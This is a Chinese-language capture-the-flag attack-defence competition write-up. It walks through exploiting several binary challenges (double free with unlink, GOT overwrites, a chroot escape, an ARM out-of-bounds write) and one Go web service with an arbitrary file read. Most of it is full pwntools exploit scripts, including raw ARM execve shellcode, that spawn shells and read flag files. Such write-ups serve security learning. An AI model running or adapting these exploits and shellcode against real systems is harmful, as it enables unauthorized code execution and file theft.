感谢下队里的web师傅们，太牛逼了

记录下解出来和赛后复现（寒假看下能不能复现）的几题，不得不说，这题目太顶了orz,一共就搞出了这么几题

# class

`Ubuntu16.04 libc2.23`

个人赛的一题，最后还剩一分钟多的时候解出来了，但是由于网络问题，打不出去，有点可惜

漏洞是**double free**,我用的是`scanf`来触发`malloc_consolidate`,然后在`unlink`，最后控制了全局的指针

```python
from pwn import *

context.arch='amd64'

def cmd(c):
	p.recvuntil(">")
	p.sendline(str(c))

def take_class(descr):
	cmd(1)
	p.recvuntil("description")
	p.send(descr)
	
def edit_class(descr):
	cmd(2)
	p.recvuntil("description")
	p.send(descr)
def dele_class():
	cmd(3)
	

def take_book(descr):
	cmd(4)
	p.recvuntil("you want?")
	p.send(descr)
	
def view_book():
	cmd(5)
	
def dele_book():
	cmd(6)
	
def main(host,port=23333):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./class")
		# gdb.attach(p)
		# gdb.attach(p,"b ")
	p.recvuntil("Whats your name?")
	p.sendline("A"*8)
	p.recvuntil("Init your profile:")
	p.sendline("A"*8)
	cmd(8)
	take_class("dididada")
	take_book("A"*8)
	view_book()
	p.recvuntil("A"*8)
	libc.address = u64(p.recv(8))-0x3c4b78
	# libc_base = u64(p.recv(8))-0x3c4b78
	info("libc : " + hex(libc.address))
	# info("libc : " + hex(libc_base))
	dele_class()
	p.recvuntil(">")
	p.sendline("1"*0x400)
	dele_class()
	ptr_addr = 0x0000000006020A8
	payload = p64(0)+p64(0x31)
	payload += p64(ptr_addr-0x18)+p64(ptr_addr-0x10)
	payload += "\x00"*0x10+p64(0x30)[:7]
	take_class(payload)
	dele_book()
	
	payload = p64(1)+p64(0x6020b0)
	__free_hook = 0x3c67a8
	# payload += p64(1)+p64(libc_base+__free_hook)
	payload += p64(1)+p64(libc.symbols["__free_hook"])
	payload += "/bin/sh\x00"
	edit_class(payload)
	edit_class(p64(libc.symbols["system"]))
	dele_book()
	p.sendline("echo aaa")
	p.recvuntil("aaa\n")
	p.sendline("cat /flag")
	flag = p.recvuntil("\n")
	info(flag)
	return flag
	# p.interactive()
	
if __name__ == "__main__":
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(args["REMOTE"])
```

# awd5

`Ubuntu16.04 libc2.23`

ad题目里面最简单的了，任意地址写3个字节和一个`off_by_one`,吐槽下这个路径名:`/opt/xunca/flag.txt`（这个xunca太坑了

```python
from pwn import *

context.arch='amd64'

def cmd(c):
	p.recvuntil(">\n")
	p.sendline(str(c))

def add(length,data):
	cmd(1)
	p.recvuntil("please input length")
	p.sendline(str(length))
	p.recvuntil("please input data")
	p.send(data)
def show(idx):
	cmd(2)
	p.recvuntil("index")
	p.sendline(str(idx))
	

def dele(idx):
	cmd(3)
	p.recvuntil("index")
	p.sendline(str(idx))


def magic(addr,data):
	cmd(4)
	p.recvuntil("me give some")
	p.send(p64(addr))
	p.send(data)

def main(host,port=60001):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./bak/awd5")
		gdb.attach(p,"b* 0x000000000400B1E")
		# gdb.attach(p)
	
	buf = 0x000000000602080
	exit_got = 0x000000000602058
	free_got = 0x000000000602018
	read_got = 0x000000000602030
	main_addr = 0x000000000400A8F
	magic(exit_got,p64(main_addr)[:3])
	magic(buf,p64(read_got)[:3])
	show(0)
	p.recv()
	libc_base = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-0xf7250
	info("libc : " + hex(libc_base))
	system_offset = 0x45390
	add(0x10,"/bin/sh\x00")
	dele(1)
	add(0x10,"/bin/sh\x00")
	magic(free_got,p64(libc_base+system_offset)[:3])
	dele(1)
	# p.sendline("echo 777")
	# p.recvuntil("777")
	# p.sendline("cat /opt/xunca/flag.txt")

	p.interactive()
if __name__ == "__main__":
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    main(0)

```

# awd3

这题要逃出chroot，奇怪的是本地逃不出去，远程可以，orz

在学长的机子上测试是可以的，有、、迷

我们当时找到了[这篇文章]( https://cwe.mitre.org/data/definitions/243.html )

意思是虽然chroot了，但是没chdir,所以可以用`../../../../../etc/passwd`这种方式绕过

这题还有其它的绕过方法，我没搞出来，tcl

```c
// gcc -o -s read_flag -static -O3 read_flag.c

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main(int argc, char**argv, char**envp)
{
	char buf[0x100] = {};
	char * arg = argv[0];

	chdir("../../../../../../../../../../../../../../../../");

	int flag = open(arg, O_RDONLY, 0);
	if (flag < 0) {
		printf("cannot open file: %s\n", buf);
		exit(-1);
	}
	memset(buf, 0, 0x100);
	int nr = read(flag, buf, 0x100);
	if (nr > 0) {
		printf("%s\n", buf);
	}
	close(flag);
}
```

利用脚本(打本地的)

```python
from pwn import *
context.arch='amd64'
def main(host,port=8888):
	global p
	if host:
		try:
			p = remote(host,port,timeout=2)
		except:
			return
	else:
		p = process("./bak/awd3")
		# gdb.attach(p, '''
		# 	set follow-fork-mode child
		# 	b *0x00000000004016CA
		# 	c
		# ''')
		# p.recvuntil("elf len?\n")
		# p.sendline('1')
		# p.recvuntil("data?\n")
		# p.sendline('1')

	elf_file = open("read_flag","rb").read()
	p.recvuntil("elf len?\n")
	p.sendline(str(len(elf_file)))
	p.recvuntil("data?\n")
	p.send(elf_file)
	p.recvuntil("what arg do you wanna pass to your elf?")
	p.sendline('/flag\x00')
	p.recv()
	flag = p.recv(0x100)
	info(flag)
	p.interactive()
if __name__ == "__main__":
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	main(0)

```

# awd7

arm的pwn，这次这个题不用去猜libc还是挺友好的,我们后面上分全靠这题，tr3e学长tql！

当时的赛题环境是`Ubuntu18.04`，启动参数为`qemu-arm -L /usr/arm-linux-gnueabi awd7    `

如果出现了报错，可以试一下

```shell
sudo apt install -y qemu-user gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi
```

如果还不行的话，emmm，百度吧

调试的话只要在启动参数里加上`-g 1234`，然后用`gdb-multiarch`调试就好

程序用到的结构体

```c
00000000 node            struc ; (sizeof=0x28, mappedto_5)
00000000                                         ; XREF: .bss:nodes/r
00000000 inuse           DCB ?
00000001                 DCB ? ; undefined
00000002                 DCB ? ; undefined
00000003                 DCB ? ; undefined
00000004 ptr             DCD ?
00000008 title           DCB 24 dup(?)
00000020 sz              DCD ?
00000024 size            DCD ?
00000028 node            ends
```

稍微观察下程序的每个函数，会发现每个函数都是洞，超级多的溢出，所以补的时候把那些溢出的地方都补上去了，那天下午找了半天，突然间看到了有后门

```asm
.text:00010AAC ; ---------------------------------------------------------------------------
.text:00010AAC                 STMFD   SP!, {R11,LR}
.text:00010AB0                 ADD     R11, SP, #4
.text:00010AB4                 LDR     R0, =aBinSh     ; "/bin/sh"
.text:00010AB8                 BL      system
.text:00010ABC                 NOP
.text:00010AC0                 LDMFD   SP!, {R11,PC}
.text:00010AC0 ; ---------------------------------------------------------------------------
.text:00010AC4 off_10AC4       DCD aBinSh              ; DATA XREF: .text:00010AB4↑r
.text:00010AC4                                         ; "/bin/sh"
```

原先还在想怎么判断libc版本的，没看见程序本身就有个`system`，于是连忙赶至出一份粗糙的`exp`

```python
from pwn import *
context.update(arch='arm')

def add(title, length, cont):
	p.sendlineafter('$ ', '1')
	p.sendafter('title:', title)
	p.sendafter('length:', str(length))
	p.sendafter('content:', cont)
def show(index):
	p.sendlineafter('$ ', '2')
	p.send(p32(index)+p32(0))
def delete(index, nocheck=1):
	p.sendlineafter('$ ', '3')
	p.send(p32(index)+p32(nocheck))
def edit(index, title, cont):
	p.sendlineafter('$ ', '4')
	p.sendafter('idx:', p32(index) + p32(0))
	p.sendafter('title:', title)
	p.sendafter('content:', cont)

def exp(host, port=9702):
	global p
	if host:
		p = remote(host, port)
	else:
		# p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', '-g', '1234', './awd7'])
		p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', './awd7'])
	backdoor = 0x0010AAC
	add("dididada",0x20,"B"*8)
	add("dididada",0x20,"B"*8)
	
	edit(0,"\x00"*24+p32(0x20)*2+p32(1)+p32(0x0021048),"BBBB")
	edit(1,"dididdada",p32(backdoor))
	
	p.sendline("echo dididada")
	p.sendline("ls")
	p.interactive()

if __name__ == '__main__':
    exp(args['REMOTE'])
```

但是大家一般都守住了，所以这个也没打几个人。

后来学长说update函数没检查idx的合法性

```c
ssize_t update()
{
  ssize_t result; // r0
  char buf; // [sp+0h] [bp-1Ch]
  int v2; // [sp+4h] [bp-18h]
  int idx; // [sp+8h] [bp-14h]
  int v4; // [sp+Ch] [bp-10h]

  printf("idx:");
  result = read(0, &buf, 8u);
  idx = *(_DWORD *)&buf;
  v4 = v2;
  if ( !(nodes[*(_DWORD *)&buf].inuse ^ 1) )
  {
    printf("title:");
    read(0, nodes[idx].title, 0x32u);
    printf("content:");
    result = read(0, (void *)nodes[idx].ptr, nodes[idx].sz);
  }
  return result;
}
```

确实是没检查，而且`malloc`返回的地址和全局区里的`nodes`的偏移是固定的，所以我们可以在堆上伪造一个`node`，然后用`update`越界写改掉`exit`的`got`表，让程序退出的跳到`shellcode`地址上，最后执行shellcode来getshell

能执行shellcode是在调试的时候发现的

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
   0x10000    0x11000 r-xp     1000 0      
   0x20000    0x22000 rwxp     2000 0      
   0x20000    0x43000 rwxp    23000 0      
0xff7bd000 0xff7de000 r-xp    21000 0      
0xff7ed000 0xff7ef000 rwxp     2000 0      
0xfffee000 0xffff0000 rwxp     2000 0      [stack]
```

最终的exp:

```python
from pwn import *
context.update(arch='arm')

def exp(host, port=0):
	if host:
		p = remote(host, port)
	else:
		p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', '-singlestep', './awd7'])
		# p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi/', '-g', '1234', '-singlestep', './awd7'])
	s = p.send
	sa = p.sendafter
	sla = p.sendlineafter
	def add(title, length, cont):
		sla('$ ', '1')
		sa('title:', title)
		sa('length:', str(length))
		sa('content:', cont)
	def show(index):
		sla('$ ', '2')
		s(p32(index)+p32(0))
	def delete(index, nocheck=0):
		sla('$ ', '3')
		s(p32(index)+p32(nocheck))
	def update(index, title, cont):
		sla('$ ', '4')
		sa('idx:', p32(index) + p32(0))
		sa('title:', title)
		sa('content:', cont)
	
	sc_addr = 0x00022188
	got_exit = 0x00021034
	try:
		add('hello', 0, 'a'*8 + p32(1) + p32(got_exit) + 'n'*24 + p32(0x80) + p32(0x80))
		update(108, '0000', p32(sc_addr))
		sc = "\x68\x70\x00\xe3\x41\x71\x44\xe3\x04\x70\x2d\xe5\x2f\x7f\x02\xe3\x2f\x73\x47\xe3\x04\x70\x2d\xe5\x2f\x72\x06\xe3\x69\x7e\x46\xe3\x04\x70\x2d\xe5\x0d\x00\xa0\xe1\x73\x78\x06\xe3\x04\x70\x2d\xe5\x0c\xc0\x2c\xe0\x04\xc0\x2d\xe5\x04\x10\xa0\xe3\x0d\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0\x2d\xe5\x0d\x10\xa0\xe1\x02\x20\x22\xe0\x0b\x70\xa0\xe3\x00\x00\x00\xef"
		add('world', len(sc), sc)
		sla('$ ', '5')
	except:
		pass
	# p.sendline("cat /opt/xnuca/flag.txt")
	# flag = p.recvuntil("\n")
	# info(flag)
	
	p.interactive()

if __name__ == '__main__':
	exp(0)


```

# awd1

go语言写的

只有一份任意读文件的exp

```python
from pwn import *
import sys
import requests

def attack(ip):
	headers = {
		'user-agent': 'Mozilla/5.0 (Macintosh; wdeYKQtOhc6L8TsIm1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
	}	
	params = (
		('file', '/flag'),
	)	
	response = requests.get('http://{}:8080/info'.format(ip), headers=headers, params=params)
	flag = response.content[response.content.find("flag"):]
	return flag

def main(host,port=80):
	global p
	if host:
		# p = remote(host,port)
		pass
	else:
		pass
	
	flag = attack(host)
	info(flag)
	# p.interactive()
if __name__ == "__main__":
	try:
		main(sys.argv[1])
	except:
		pass
```

